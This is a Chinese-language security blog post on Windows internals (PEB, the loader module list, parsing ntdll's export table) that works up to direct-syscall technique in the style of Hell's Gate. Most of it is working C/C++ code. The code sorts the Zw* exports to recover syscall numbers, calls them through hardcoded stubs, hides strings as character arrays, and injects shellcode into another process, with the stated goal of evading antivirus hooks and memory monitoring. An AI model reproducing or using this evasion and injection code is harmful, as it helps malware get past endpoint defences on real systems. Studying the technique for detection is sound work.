# 1 前置

## PEB\TEB

PEB(Process Environment
Block，进程环境块)：存放进程信息，准确的PEB地址应该从系统的EXPROCESS结构的0x1b0偏移出获得，但这个结构位于系统地址空间，访问需要
ring0权限，在X86的系统通过fs寄存器偏移0x30处获取PEB（x64下GS寄存器偏移0x60）。

    
    
    mov eax, fs:[0x30]
    mov PEB, eax
    

TEB(Thread Environment Block，线程环境块)：
存放线程信息，位于用户地址空间，进程中的每个线程都有自己的一个TEB.通过fs寄存器来访问，一般储存在fs:[0]（x64下GS偏移0）。

## dll 调用 内核的api的方式（R3->R0）

    
    
    OpenProcess() [Kernel32] -> OpenProcess() [Kernelbase] -> NtOpenProcess() [Ntdll] -> Direct syscall to the kernel -> | Kernel Mode |
    

## ssn与syscall

所有r3的api调用的时候过程都是如下，只是每个api的syscallnumber（ssn）不一样，放进eax中的值不一样，只要找到这个就可以实现syscall。

![1661312258_63059d02ba808e7dddd81.png!small](https://image.3001.net/images/20220824/1661312258_63059d02ba808e7dddd81.png!small)

追到最后ntdll中实际调用r0的内核就是通过这个硬编码来实现的 4c 8b d1 b8 xx 0f 05 c3，

![1661312270_63059d0e2aa704c1d1c82.png!small](https://image.3001.net/images/20220824/1661312270_63059d0e2aa704c1d1c82.png!small)

如下某个进程加载的ntdll里NtOpenPrcess的反汇编，可以看到它的ssn是0x26。

![1661312283_63059d1b12ef4137d0811.png!small](https://image.3001.net/images/20220824/1661312283_63059d1b12ef4137d0811.png!small)

# 2 跨过r3 Kernel32 dll导出表的方式直接syscall调用r0函数

流程：  
不使用GetModuleHandle找到ntdll 的基址  
解析DLL的导出表  
查找syscall number  
执行syscall

我们要做的就是搞到api的syscallnumber用syscall的方式直接调用，通过直接读取进程第二个导入模块即NtDLL，解析结构然后遍历导出表，得到函数地址，有两种方式获取SSN，这里通过第二种方式来实现：  
1、将这个函数读取出来通过0xb8（mov
eax,xx）这个硬编码来动态获取对应的系统调用号，根据函数名Hash找到函数地址，地狱之门采用的就是这种方式（某些杀软会加入HOOK Ntdll
加入jmp指令破坏硬编码的顺序，这种遍历的方式可能就不行了）；  
2、将所有函数地址排序，这个顺序也就是对应了SSN；  
然后利用syscall，从而绕过内存监控，在自己程序中执行了NTDLL的导出函数而不是直接通过LoadLibrary然后GetProcAddress。

## 寻找dll基地址

x64下的teb(GS:[0])偏移0x60就是peb，

![1661314582_6305a61609446866f5c16.png!small](https://image.3001.net/images/20220824/1661314582_6305a61609446866f5c16.png!small)

通过PEB可以看到有个PEB\\_LDR\\_DATA结构体，它包含了为进程加载模块的信息（所有模块的数据链表），

![1661312468_63059dd4bc650a97be8de.png!small](https://image.3001.net/images/20220824/1661312468_63059dd4bc650a97be8de.png!small)

其中有三个链表，分别代表模块加载顺序，模块在内存中的加载顺序以及模块初始化装载的顺序，

![1661312612_63059e64049a829fc3916.png!small](https://image.3001.net/images/20220824/1661312612_63059e64049a829fc3916.png!small)

这里看到LDR的地址0x00007ffc\\`066fc4c0偏移0x10就是InLoadOrderModuleList ，跟进这个链表看看，

![1661312515_63059e03448a7018ac63b.png!small](https://image.3001.net/images/20220824/1661312515_63059e03448a7018ac63b.png!small)

微软自己的定义，指向的是LDR_DATA_TABLE_ENTRY，地址0x000002e9`2bba2510指向的就是这个结构，

![1661312421_63059da553dd12c45b2da.png!small](https://image.3001.net/images/20220824/1661312421_63059da553dd12c45b2da.png!small)

x86的系统下的LDR_DATA_TABLE_ENTRY结构，后面的基址每个加0x10就是对应的x64的,可以看到有dll的地址名称之类的信息。

![1661312410_63059d9a374fcfb54e644.png!small](https://image.3001.net/images/20220824/1661312410_63059d9a374fcfb54e644.png!small)

跟进0x000002e9\\`2bba2510这个地址看看，看到了模块基址，名称存储的地址，

![1661313076_6305a0344a14206c87b98.png!small](https://image.3001.net/images/20220824/1661313076_6305a0344a14206c87b98.png!small)

这里了解了大致的逻辑后，就可以尝试找到ntdll地址了，一般它的加载顺序是第二个（某些杀软也会变动这个加载位置，不是绝对的），其次是kernel32，代码实现如下。

    
    
    #include <iostream>
    #include "peb.h"
    int main()
    {
        //x64下通过gs寄存器的偏移0x60得到PEB，x86通过fs寄存器偏移0x30得到PEB
        PPEB Peb = (PPEB)__readgsqword(0x60); 
        PLDR_MODULE pLoadModule;
        pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink - 0x10);
        PLDR_MODULE pFirstLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink - 0x10);
    
        //遍历所有内存中的模块和地址
        do
        {
            printf("Module Name:%ws\r\nModule Base Address:%p\r\n\r\n", pLoadModule->FullDllName.Buffer,pLoadModule->BaseAddress);
            pLoadModule = (PLDR_MODULE)((PBYTE)pLoadModule->InMemoryOrderModuleList.Flink - 0x10);
        } while ((PLDR_MODULE)((PBYTE)pLoadModule->InMemoryOrderModuleList.Flink -0x10) != pFirstLoadModule);
    }
    

## 解析导出地址表 (EAT)

拿到dll基地址以后，就可以找到dll的函数导出地址了，导出地址表存在IMAGE_OPTIONAL_HEADER结构体中，类型如下：

    
    
    typedef struct _IMAGE_EXPORT_DIRECTORY {
        DWORD   Characteristics;
        DWORD   TimeDateStamp;
        WORD    MajorVersion;
        WORD    MinorVersion;
        DWORD   Name;                   // The name of the Dll
         DWORD   Base;                   // Number to add to the values found in AddressOfNameOrdinals to retrieve the "real" Ordinal number of the function (by real I mean used to call it by ordinals).
         DWORD   NumberOfFunctions;      // Number of all exported functions
         DWORD   NumberOfNames;          // Number of functions exported by name
         DWORD   AddressOfFunctions;     // Export Address Table. Address of the functions addresses array.
         DWORD   AddressOfNames;         // Export Name table. Address of the functions names array.
         DWORD   AddressOfNameOrdinals;  // Export sequence number table.  Address of the Ordinals (minus the value of Base) array.             } IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
    

拿到基址然后去遍历PE头文件从而获取导出地址表,代码参考网上师傅的，得到ntdll的地址以及导出函数：

    
    
    int GetPeHeader()
    {
        PBYTE ImageBase;
        PIMAGE_DOS_HEADER Dos = NULL;
        PIMAGE_NT_HEADERS Nt = NULL;
        PIMAGE_FILE_HEADER File = NULL;
        PIMAGE_OPTIONAL_HEADER Optional = NULL;
        PIMAGE_EXPORT_DIRECTORY ExportTable = NULL;
    
        //获取PEB
        PPEB Peb = (PPEB)__readgsqword(0x60);
        PLDR_MODULE pLoadModule;
        // 找到NTDLL的基地址
        pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
        ImageBase = (PBYTE)pLoadModule->BaseAddress;
    
        Dos = (PIMAGE_DOS_HEADER)ImageBase;
        if (Dos->e_magic != IMAGE_DOS_SIGNATURE)
            return 1;
        Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos->e_lfanew);
        File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos->e_lfanew + sizeof(DWORD)));
        Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + sizeof(IMAGE_FILE_HEADER));
    
        //获取导出表
        ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional->DataDirectory[0].VirtualAddress);
    
        PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable->AddressOfFunctions));
        PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable->AddressOfNames);
        PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-> AddressOfNameOrdinals);
    
    
        for (WORD cx = 0; cx < ExportTable->NumberOfNames; cx++) 
        {
            PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);
            PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
            printf("Function Name:%s\tFunction Address:%p\n", pczFunctionName, pFunctionAddress);
        }
    }
    

# 3 代码实现

如上我们得到函数地址以后就可以开始syscall手动调用ntdll里的函数了，这里我的思路是按地址大小排序好每个函数，然后按index得到ssn，在排序的过程中查找我需要的函数名，得到直接返回，如下实现一个syscall方式的进程注入。

  * 定义一下ntdllsyscall时的硬编码

    
    
    CHAR syscall_sc[] = {
    	0x4c, 0x8b, 0xd1,
    	0xb8, 0xb9, 0x00, 0x00, 0x00,
    	0x0f, 0x05,
    	0xc3
    };
    

  * 遍历ssn时匹配我们需要的函数ssn

    
    
    int GetSSN(std::string apiname)
    {
    	std::map<int, std::string> Nt_Table;
    	PBYTE ImageBase;
    	PIMAGE_DOS_HEADER Dos = NULL;
    	PIMAGE_NT_HEADERS Nt = NULL;
    	PIMAGE_FILE_HEADER File = NULL;
    	PIMAGE_OPTIONAL_HEADER Optional = NULL;
    	PIMAGE_EXPORT_DIRECTORY ExportTable = NULL;
    
    	PPEB Peb = (PPEB)__readgsqword(0x60);
    	PLDR_MODULE pLoadModule;
    
    	pLoadModule = (PLDR_MODULE)((PBYTE)Peb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
    	ImageBase = (PBYTE)pLoadModule->BaseAddress;
    
    	Dos = (PIMAGE_DOS_HEADER)ImageBase;
    	if (Dos->e_magic != IMAGE_DOS_SIGNATURE)
    		return 1;
    	Nt = (PIMAGE_NT_HEADERS)((PBYTE)Dos + Dos->e_lfanew);
    	File = (PIMAGE_FILE_HEADER)(ImageBase + (Dos->e_lfanew + sizeof(DWORD)));
    	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + sizeof(IMAGE_FILE_HEADER));
    	ExportTable = (PIMAGE_EXPORT_DIRECTORY)(ImageBase + Optional->DataDirectory[0].VirtualAddress);
    
    	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable->AddressOfFunctions));
    	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ImageBase + ExportTable->AddressOfNames);
    	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable->AddressOfNameOrdinals);
    	for (WORD cx = 0; cx < ExportTable->NumberOfNames; cx++)
    	{
    		PCHAR pczFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[cx]);
    		PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
    		if (strncmp((char*)pczFunctionName, "Zw", 2) == 0) {
    
    			Nt_Table[(int)pFunctionAddress] = (std::string)pczFunctionName;
    		}
    	}
    	int index = 0;
    	for (std::map<int, std::string>::iterator iter = Nt_Table.begin(); iter != Nt_Table.end(); ++iter) {
    
    		if (apiname == iter->second) {
    			std::cout << "index:" << index << ' ' << iter->second << std::endl;
    			return index;
    		}
    
    		index++;
    	}
    }
    

  * 这里syscall一下ZwOpenProcess和ZwAllocateVirtualMemory这两个api试试水，替换掉硬编码的ssn，然后定义函数指针，地址为替换好ssn的syscall硬编码

    
    
    //通过ascii存储到堆栈的方式，去除字符串特征
    const char Zwp[] = {'Z','w','O','p','e','n','P','r','o','c','e','s','s',0};
    const char ZwA[] = {'Z','w','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    
    syscall_sc[4] = GetSSN(Zwp);
    MyOpenProcess Mopenprocess = (MyOpenProcess)&syscall_sc;
    
    //打开目标进程，返回句柄给hprocess
    NTSTATUS Status = Mopenprocess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &clientid);
    
    LPVOID Address = NULL;
    SIZE_T uSize = 0x1000;
    syscall_sc[4] = GetSSN(ZwA);
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)&syscall_sc;
    
    //在目标进程中开辟私有内存
    NTSTATUS status = NtAllocateVirtualMemory(hProcess, &Address, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
    

  * 将shellcode写入到目标进程的私有内存中

    
    
    WriteProcessMemory(hProcess, Address, fb.c_str(), fb.size(), NULL);
    

可以看到 已经写入成功了。

![1661312557_63059e2d71b00daaf61a5.png!small](https://image.3001.net/images/20220824/1661312557_63059e2d71b00daaf61a5.png!small)

## 参考

> https://xz.aliyun.com/t/11496  
> https://github.com/am0nsec/HellsGate/  
> https://www.anquanke.com/post/id/267345#h3-7  
> https://sharpblog.cn/post/2021-06-29-win10-x64-process-create-analysis

